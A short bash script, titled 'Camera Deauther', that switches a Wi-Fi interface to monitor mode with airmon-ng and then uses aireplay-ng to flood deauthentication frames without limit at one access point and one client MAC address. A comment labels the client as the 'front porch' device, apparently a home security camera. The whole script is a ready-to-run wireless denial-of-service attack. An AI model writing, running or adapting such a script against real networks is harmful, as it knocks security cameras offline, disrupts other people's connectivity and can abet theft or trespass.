#!/bin/bash

clear
echo ""

#Configuration

AP_MAC="74:83:C2:B1:4D:41"
TARGET_MAC='F4:AF:E7:D1:5A:35' #front porch
INTERFACE='wlan1'

echo "---------------------------------"
echo "---------CAMERA DEAUTHER---------"
echo "---------------------------------"

airmon-ng start $INTERFACE 
sleep 4
#New interface name
INTERFACE+="mon"

aireplay-ng -0 0 -a $AP_MAC -c $TARGET_MAC $INTERFACE
